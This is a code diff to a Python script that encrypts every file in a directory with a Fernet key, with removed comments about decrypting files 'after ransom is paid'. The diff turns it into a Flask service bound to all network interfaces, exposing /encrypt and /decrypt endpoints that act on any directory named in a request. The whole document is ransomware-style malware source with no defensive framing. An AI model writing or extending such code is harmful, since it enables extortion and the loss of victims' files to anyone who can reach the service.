@@ -1,5 +1,8 @@
+from flask import Flask, request, jsonify
 import os
 from cryptography.fernet import Fernet
+
+app = Flask(__name__)
 
 # Generate a key for encryption
 key = Fernet.generate_key()
@@ -25,8 +28,17 @@ def decrypt_files(directory):
             with open(os.path.join(directory, filename), 'w') as file:
                 file.write(decrypted_data.decode())
 
-# Encrypt files in the 'files' directory
-encrypt_files('files')
+@app.route('/encrypt', methods=['POST'])
+def encrypt():
+    directory = request.json.get('directory')
+    encrypt_files(directory)
+    return jsonify({"status": "files encrypted"})
 
-# To decrypt files after ransom is paid:
-# decrypt_files('files')
+@app.route('/decrypt', methods=['POST'])
+def decrypt():
+    directory = request.json.get('directory')
+    decrypt_files(directory)
+    return jsonify({"status": "files decrypted"})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
